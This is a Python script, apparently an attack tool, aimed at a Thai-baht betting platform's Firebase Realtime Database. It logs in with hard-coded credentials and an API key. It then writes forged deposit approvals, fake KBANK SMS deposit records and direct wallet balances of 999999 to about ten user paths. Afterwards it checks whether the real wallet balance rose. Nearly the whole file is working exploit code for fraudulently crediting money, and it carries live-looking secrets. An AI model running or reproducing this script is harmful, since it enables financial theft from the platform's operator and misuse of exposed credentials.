#!/usr/bin/env python3
"""probe_rtdb_trigger_credit.py — Test if RTDB writes trigger wallet credit on vak88z2."""
import json
import requests
import time
import uuid

API_KEY = "AIzaSyAELPsIAYigvKgJBAsbl_3WM9_tNOr5UiE"
RTDB_URL = "https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app"
USER_ID = "ff6c08fb-c109-4c33-9b9f-342e2aca3822"
TID = "af6efb584a3d317b5a11ab6209b88e1b"

# vak88z2 mgapi for wallet check
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"

def refresh_fb_token():
    refresh_tok = open("fb_refresh_token_new.txt").read().strip()
    url = f"https://securetoken.googleapis.com/v1/token?key={API_KEY}"
    r = requests.post(url, data={"grant_type": "refresh_token", "refresh_token": refresh_tok}, timeout=15)
    return r.json().get("id_token") if r.ok else None

def get_platform_jwt():
    # Auth to vak88z2 platform
    PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        timeout=15)
    return r.json().get("accessToken") if r.ok else None

def get_wallet(jwt):
    r = requests.get(f"{MGAPI}/mb/wallet",
        headers={"Authorization": f"Bearer {jwt}", "template": "vn"},
        timeout=10)
    if r.ok:
        data = r.json().get("data", [{}])
        return data[0].get("balance", "?") if isinstance(data, list) else "?"
    return f"ERR:{r.status_code}"

# Get tokens
fb_token = refresh_fb_token()
platform_jwt = get_platform_jwt()
print(f"FB token: {'OK' if fb_token else 'FAIL'}")
print(f"Platform JWT: {'OK' if platform_jwt else 'FAIL'}")

if not fb_token or not platform_jwt:
    exit(1)

# Check initial wallet
initial_wallet = get_wallet(platform_jwt)
print(f"\n=== Initial wallet: {initial_wallet} THB ===")

# Generate test deposit ID
test_id = str(uuid.uuid4())
test_amount = 50000.0
print(f"\nTest deposit ID: {test_id}")
print(f"Test amount: {test_amount}")

# Write to various paths that might trigger credit
paths_to_try = [
    # 1. DEPOSIT_APPROVE - already confirmed writable
    (f"/users/{USER_ID}/DEPOSIT_APPROVE/{test_id}", {
        "amount": str(test_amount),
        "approve_status": "success",
        "approved_by": "admin",
        "status": "success",
        "timestamp": int(time.time() * 1000),
        "uid": USER_ID,
        "credited": True
    }),

    # 2. DEPOSIT_CONFIRM
    (f"/users/{USER_ID}/DEPOSIT_CONFIRM/{test_id}", {
        "amount": test_amount,
        "approve_status": "success",
        "bank_code": "KBANK",
        "created_at": int(time.time() * 1000),
        "credited": True,
        "processed": True,
        "status": "success",
        "tid": TID,
        "tx_id": test_id,
        "uid": USER_ID
    }),

    # 3. deposit_transaction
    (f"/users/{USER_ID}/deposit_transaction/{test_id}", {
        "amount": test_amount,
        "approve_status": "success",
        "credited": True,
        "id": test_id,
        "status": "success",
        "timestamp": int(time.time()),
        "uid": USER_ID
    }),

    # 4. deposits
    (f"/users/{USER_ID}/deposits/{test_id}", {
        "amount": test_amount,
        "approve_status": "success",
        "credited": True,
        "id": test_id,
        "status": "success",
        "timestamp": int(time.time() * 1000),
        "uid": USER_ID
    }),

    # 5. wallet direct update attempt
    (f"/users/{USER_ID}/wallet", {
        "available": 999999.0,
        "balance": 999999.0,
        "credit": 999999.0,
        "timestamp": int(time.time() * 1000),
        "total_balance": 999999.0,
        "total_deposit": 999999.0,
        "updated_at": int(time.time() * 1000)
    }),

    # 6. balance direct
    (f"/users/{USER_ID}/balance", 999999.0),

    # 7. credit direct
    (f"/users/{USER_ID}/credit", 999999.0),

    # 8. DEPOSIT_MEMBER_KBANK with SMS data
    (f"/users/{USER_ID}/DEPOSIT_MEMBER_KBANK/{test_id}", {
        "address": "K-Bank",
        "amount": str(test_amount),
        "bank_code": "KBANK",
        "bank_no": "1029600000052",
        "credited": True,
        "message": f"K+ 09/10/26 22:35 +{test_amount:.2f} ref K6B60122",
        "sms_id": f"kbank_{int(time.time())}_{test_id[:8]}",
        "status": "success",
        "timestamp": int(time.time() * 1000),
        "tx_id": test_id,
        "type": "deposit",
        "uid": USER_ID
    }),

    # 9. transactions
    (f"/users/{USER_ID}/transactions/{test_id}", {
        "amount": test_amount,
        "credited": True,
        "status": "approved",
        "timestamp": int(time.time()),
        "uid": USER_ID,
        "user_id": USER_ID
    }),

    # 10. wallet_history
    (f"/users/{USER_ID}/wallet_history/{test_id}", {
        "action": "credit",
        "amount": test_amount,
        "bank_code": "KBANK",
        "currency": "THB",
        "status": "success",
        "timestamp": int(time.time() * 1000),
        "transaction_id": test_id,
        "uid": USER_ID
    }),
]

print("\n=== Writing to RTDB paths ===")
for path, payload in paths_to_try:
    url = f"{RTDB_URL}{path}.json?auth={fb_token}"
    r = requests.put(url, json=payload, timeout=15)
    status = "OK" if r.status_code == 200 else f"FAIL:{r.status_code}"
    print(f"  PUT {path.split('/')[-1]}: {status}")
    if r.status_code != 200:
        print(f"      {r.text[:100]}")

# Wait a bit for any async processing
print("\n=== Waiting 5s for backend processing ===")
time.sleep(5)

# Check wallet again
final_wallet = get_wallet(platform_jwt)
print(f"\n=== Final wallet: {final_wallet} THB ===")

if float(str(final_wallet).replace("ERR:", "0")) > float(str(initial_wallet).replace("ERR:", "0")):
    print(f"\n[!!!] WALLET INCREASED! Delta: {float(final_wallet) - float(initial_wallet)} THB")
else:
    print(f"\nNo wallet change (RTDB writes don't directly credit)")

# Also read back the RTDB wallet value
print("\n=== RTDB wallet value ===")
url = f"{RTDB_URL}/users/{USER_ID}/wallet.json?auth={fb_token}"
r = requests.get(url, timeout=10)
if r.ok:
    print(f"  RTDB wallet: {json.dumps(r.json(), indent=2)}")
